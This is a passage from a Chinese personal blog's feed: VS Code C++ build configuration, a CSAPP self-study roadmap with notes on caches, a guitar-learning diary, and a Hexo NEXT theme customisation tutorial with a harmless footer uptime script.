class="attr">&quot;__errc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__hash_table&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__locale&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__mutex_base&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__node_handle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__split_buffer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__threading_support&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__tree&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__verbose_abort&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;array&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;atomic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bitset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cctype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charconv&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;clocale&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;complex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdarg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstddef&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdio&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdlib&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstring&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ctime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cwchar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cwctype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;deque&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;exception&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;initializer_list&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;iomanip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ios&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;iosfwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;iostream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;istream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limits&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;locale&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;map&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mutex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;new&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ostream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;queue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ratio&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;set&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sstream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stdexcept&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;streambuf&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;string_view&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;system_error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tuple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;typeinfo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;unordered_map&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;variant&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vector&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__bits&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__nullptr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__tuple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;chrono&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;compare&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;concepts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;memory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type_traits&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;algorithm&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="tasks-json-1"><a href="#tasks-json-1" class="headerlink" title="tasks.json"></a>tasks.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: clang++ 生成活动文件&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/clang++&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fcolor-diagnostics&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-fansi-escape-codes&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;//test&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-std=c++11&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试器生成的任务。&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP自学指北</title>
    <url>/CSAPP/lab0/2024/02/27/</url>
    <content><![CDATA[<blockquote>
<p>Csapp真心不好学</p>
</blockquote>
<h1 id="总体原则"><a href="#总体原则" class="headerlink" title="总体原则"></a>总体原则</h1><p>尽量做完所有的exercise,做了一部分,感觉出的不错</p>
<p>看书前沐浴更香,保持心静(逃</p>
<h1 id="链接推荐"><a href="#链接推荐" class="headerlink" title="链接推荐"></a>链接推荐</h1><h2 id="计算机科学速成课"><a href="#计算机科学速成课" class="headerlink" title="计算机科学速成课"></a><a href="https://www.bilibili.com/video/BV1EW411u7th">计算机科学速成课</a></h2><p> 推荐大家在正式学习前花一点时间看完这个,只需要一点点时间,就能够对计算机有一个较为全面的认识</p>
<h2 id="CSAPP导读"><a href="#CSAPP导读" class="headerlink" title="CSAPP导读"></a><a href="https://fengmuzi2003.gitbook.io/csapp3e/">CSAPP导读</a></h2><p>我主要是以这个为索引阅读的,主要是光啃书真的太困难了,我的bomblab就是光啃书做的,痛苦死了</p>
<h2 id="中英精校字幕课程"><a href="#中英精校字幕课程" class="headerlink" title="中英精校字幕课程"></a><a href="https://www.bilibili.com/video/BV1iW411d7hd">中英精校字幕课程</a></h2><p>这个课程除了没有助教的补充说明(这个在Csapp导读里面有链接),其余部分还是很不错的,字幕完整精确(要注意，字幕是由作者谷歌机翻再手动改一点的，所以有些地方可能不是人话)</p>
<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p>整本书思维导图:</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402271948748.png" alt="image-20240227194749494"></p>
<p>读书做lab的路线:</p>
<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>略读</p>
<h2 id="第二章-信息表示和处理"><a href="#第二章-信息表示和处理" class="headerlink" title="第二章:信息表示和处理"></a>第二章:信息表示和处理</h2><p>lab1</p>
<h2 id="第三章程序的机器级表示"><a href="#第三章程序的机器级表示" class="headerlink" title="第三章程序的机器级表示"></a>第三章程序的机器级表示</h2><p>推荐书目<a href="https://www.zhihu.com/search?q=%E7%8E%8B%E7%88%BD&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2655186100%7D">王爽</a>的<strong>《汇编语言》</strong>,可以做lab2_bomblab和lab3_attacklab</p>
<h2 id="第四章-处理器体系结构"><a href="#第四章-处理器体系结构" class="headerlink" title="第四章:处理器体系结构"></a>第四章:处理器体系结构</h2><p>看书的时候看的很懵,包括且不限于中文版和英文版,然后去查csapp的课程视频,发现教授也没讲,在导读页面看见这么一段话</p>
<blockquote>
<p>CMU的教授没有给出对应的视频，我也不推荐大家阅读原书第4章，原因：Y86-64 不是一个商业可用的指令集架构，意味着你学了之后基本上没有实用价值，另外，Y86-64 的设计并不优雅，不是特别值得学习。</p>
<p><strong>推荐教材</strong>：计算机组成与设计: 硬件&#x2F;软件接口：MIPS版本 或者 RISC-V版本，以下简称P&amp;H Book。</p>
</blockquote>
<p>竟然如此,贯彻减负宗旨,先跳过,之后再学!(hhh,主要是我懒)</p>
<h2 id="第五章-优化程序处理"><a href="#第五章-优化程序处理" class="headerlink" title="第五章:优化程序处理"></a>第五章:优化程序处理</h2><p><a href="https://www.bilibili.com/video/BV1iW411d7hd?p=10">课程视频</a></p>
<blockquote>
<p>每一个离谱的规定后面都有离谱的事件</p>
</blockquote>
<p><a href="https://www.bilibili.com/video/BV1iW411d7hd">课程视频</a>听完这个课后,我的心情belike:好像听了什么,又没听懂</p>
<p>重点关键词:</p>
<p>聪明且保守的compiler,有时你写的程序会阻止他做优化:</p>
<ul>
<li>precedure side-effects</li>
<li>memory alising</li>
</ul>
<p>优化方式:</p>
<ol>
<li><p>code motion</p>
</li>
<li><p>loop unrolling</p>
</li>
<li><p>auto vectorization</p>
</li>
</ol>
<h2 id="第六章-存储器层次结构"><a href="#第六章-存储器层次结构" class="headerlink" title="第六章:存储器层次结构"></a>第六章:存储器层次结构</h2><p><a href="https://www.bilibili.com/video/BV1iW411d7hd?p=11">课程视频</a></p>
<h3 id="Storage-technologies-and-trend"><a href="#Storage-technologies-and-trend" class="headerlink" title="Storage technologies and trend;"></a>Storage technologies and trend;</h3><p>SRAM和DRAM的区别.SRAM在各方面更优,更贵(<del>但这不是他的缺点,是你的</del>)</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122102703.png" alt="image-20240306153131665"></p>
<p>Disk Capacity</p>
<p>Disk assess time</p>
<ul>
<li>Seek time</li>
<li>Rotational latency</li>
<li>Transfer time</li>
</ul>
<p>Solid state Disks</p>
<h3 id="Locality-of-reference"><a href="#Locality-of-reference" class="headerlink" title="Locality of reference"></a>Locality of reference</h3><p><a href="https://www.bilibili.com/video/BV1iW411d7hd?p=12">课程视频</a></p>
<p>Locality:</p>
<ul>
<li><p>Temporal Locality(时间局部性)</p>
</li>
<li><p>Spatial Locality(空间局部性)</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122102716.png" alt="image-20240307195001705" style="zoom:50%;" /></li>
</ul>
<p>Memory Hierarchy</p>
<p>Cache—Because of the locality</p>
<ul>
<li><p>Hits</p>
</li>
<li><p>Miss</p>
</li>
</ul>
<ol>
<li>Cold(Compulsory) Miss</li>
<li>Conflict Miss</li>
<li>Capacity Miss</li>
</ol>
<p>General Cache organization(S,E,B)</p>
<p>cache size&#x3D;S<em>E</em>B</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122102726.png" alt="image-20240307202854523" style="zoom: 50%;" />

<p>Cache Read</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122102734.png" alt="image-20240307203323382" style="zoom:50%;" />

<p>The example of read</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122104735.png"></p>
<p>Write</p>
<p>Cache Performance Metrics</p>
<ul>
<li>Miss Rate</li>
<li>Hit time</li>
<li>Miss Penalty</li>
</ul>
<p>99% hits is twice as good as 97%</p>
<p>Performance impact of caches</p>
<ul>
<li>The memory mountain</li>
<li>Rearranging loops to improve spatial locality</li>
<li>using blocking to improve temporal locality</li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>guitar_learn</title>
    <url>/PLAY/guitar_learn/2024/01/10/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这几日学了吉他，试图看到吉他的大门，才恍然间发现自己的音准很差，听不出音，每天也不怎么练琴，断断续续练了十几二十天，勉强把爱的罗曼史弹完，现在脱离了<a href="https://space.bilibili.com/87918598/channel/collectiondetail?sid=185860">吉他大学霸的基础课</a>,转而投向了<a href="https://space.bilibili.com/326251291/channel/collectiondetail?sid=434227&ctype=0">元子弹吉他</a>的基础课,主要是感觉吉他大学霸讲的属实是找不到什么练琴的快感，太枯燥了，练琴是为了开心，就应该去弹曲子，这才是正路，有着强烈的正反馈，而不是天天练基本功折磨自己。目前已经在击弦努力了，预计是每天练会一门课，同时对之前的课程谱子进行复习，争取稳扎稳打，每日都有练习</p>
<h3 id="会的曲子"><a href="#会的曲子" class="headerlink" title="会的曲子"></a>会的曲子</h3><ol>
<li><a href="https://www.bilibili.com/video/BV1Vb411c7x5/">《爱的罗曼史》</a></li>
<li><a href="https://www.bilibili.com/video/BV1x4411U7n7/">《少年的梦》</a></li>
<li>正在练习<a href="https://www.bilibili.com/video/av50052102/">&lt;&lt;无题&gt;&gt;</a></li>
</ol>
<p>喜欢的频道</p>
<ul>
<li><p><a href="https://space.bilibili.com/28239752/video">苍小天</a></p>
</li>
<li><p><a href="https://space.bilibili.com/3546593768770315/video">Marcin</a><del>他终于来b站了!!!</del></p>
</li>
<li><p><a href="https://space.bilibili.com/326251291/video">元子弹吉他</a></p>
</li>
</ul>
<h3 id="喜欢的曲子"><a href="#喜欢的曲子" class="headerlink" title="喜欢的曲子"></a>喜欢的曲子</h3><ol>
<li><p><a href="https://www.bilibili.com/video/BV1Yt411w73S?p=31&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">marcin patrzalek美国达人秀（命运交响曲和toxicity)</a></p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1Yt411w73S?p=33&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">marcin patrzalek-Moonlight Sonata(月光奏鸣曲)</a></p>
</li>
</ol>
<h3 id="Good-Lucky"><a href="#Good-Lucky" class="headerlink" title="Good Lucky"></a>Good Lucky</h3><blockquote>
<p>愿能有所成长，有所进步</p>
</blockquote>
]]></content>
      <categories>
        <category>PLAY</category>
      </categories>
      <tags>
        <tag>学习笔记，guitar</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next优化搜集整理</title>
    <url>/EATPOOP/theme_better/2023/12/22/</url>
    <content><![CDATA[<blockquote>
<p>以下是自己在研究NEXT主题的时候想要完善自己的主题搜寻的整理的方法</p>
</blockquote>
<h2 id="添加阅读时间字数提示"><a href="#添加阅读时间字数提示" class="headerlink" title="添加阅读时间字数提示"></a>添加阅读时间字数提示</h2><p>效果如图：</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318548.jpg" alt="blob">

<ol>
<li>git 黑窗口中输入以下命令：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>在blog的根目录的 _config中 复制下面这段话到末尾</strong></li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time</span>:</span><br><span class="line">  <span class="attr">symbols</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">time</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_symbols</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_time</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude_codeblock</span>: <span class="literal">false</span></span><br><span class="line">  <span class="attr">awl</span>: <span class="number">2</span>    </span><br><span class="line">  <span class="attr">wpm</span>: <span class="number">275</span></span><br><span class="line">  <span class="attr">suffix</span>: <span class="string">&quot;mins.&quot;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>在 <strong>主题的 config文件中找到，并且 输入 true即可，效果可以自行查看。</strong></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318577.jpg" alt="blob"></p>
<h2 id="添加网站运行时间"><a href="#添加网站运行时间" class="headerlink" title="添加网站运行时间"></a>添加网站运行时间</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">F:\hexo\blog\themes\next\layout\_partials\footer.swig</span><br></pre></td></tr></table></figure>

<p>在<strong>文件的末尾</strong>复制粘贴以下内容：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 网站运行时间的设置 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;timeDate&quot;</span>&gt;</span>载入天数...<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;times&quot;</span>&gt;</span>载入时分秒...<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">createtime</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> grt= <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;03/01/2023 10:00:00&quot;</span>); <span class="comment">//此处修改你的建站时间或者网站上线时间</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        now.<span class="title function_">setTime</span>(now.<span class="title function_">getTime</span>()+<span class="number">250</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        days = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>; dnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(days);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        hours = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> - (<span class="number">24</span> * dnum); hnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(hours);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span>(<span class="title class_">String</span>(hnum).<span class="property">length</span> ==<span class="number">1</span> )&#123;hnum = <span class="string">&quot;0&quot;</span> + hnum;&#125; minutes = (now - grt ) / <span class="number">1000</span> /<span class="number">60</span> - (<span class="number">24</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * hnum);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        mnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(minutes); <span class="keyword">if</span>(<span class="title class_">String</span>(mnum).<span class="property">length</span> ==<span class="number">1</span> )&#123;mnum = <span class="string">&quot;0&quot;</span> + mnum;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        seconds = (now - grt ) / <span class="number">1000</span> - (<span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * <span class="number">60</span> * hnum) - (<span class="number">60</span> * mnum);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        snum = <span class="title class_">Math</span>.<span class="title function_">round</span>(seconds); <span class="keyword">if</span>(<span class="title class_">String</span>(snum).<span class="property">length</span> ==<span class="number">1</span> )&#123;snum = <span class="string">&quot;0&quot;</span> + snum;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;timeDate&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;本站已安全运行 &quot;</span>+dnum+<span class="string">&quot; 天 &quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;times&quot;</span>).<span class="property">innerHTML</span> = hnum + <span class="string">&quot; 小时 &quot;</span> + mnum + <span class="string">&quot; 分 &quot;</span> + snum + <span class="string">&quot; 秒.&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="built_in">setInterval</span>(<span class="string">&quot;createtime()&quot;</span>,<span class="number">250</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>即可在网页的页脚显示网站已经运行了多长时间</p>
<p>效果如图下所示</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318589.jpg">

<h2 id="右上角Github图标"><a href="#右上角Github图标" class="headerlink" title="右上角Github图标"></a>右上角Github图标</h2><p>直接在主题配置文件中搜索：<code>github_banner</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># <span class="string">`Follow me on GitHub`</span> banner <span class="keyword">in</span> the top-right corner.</span><br><span class="line"><span class="attr">github_banner</span>:</span><br><span class="line">  <span class="attr">enable</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">permalink</span>: <span class="attr">https</span>:<span class="comment">//github.com/zhzvite</span></span><br><span class="line">  <span class="attr">title</span>: <span class="title class_">Follow</span> me on <span class="title class_">GitHub</span></span><br></pre></td></tr></table></figure>

<p>然后修改内容即可。</p>
<p>如下图所示：</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318597.jpg" alt="blob">

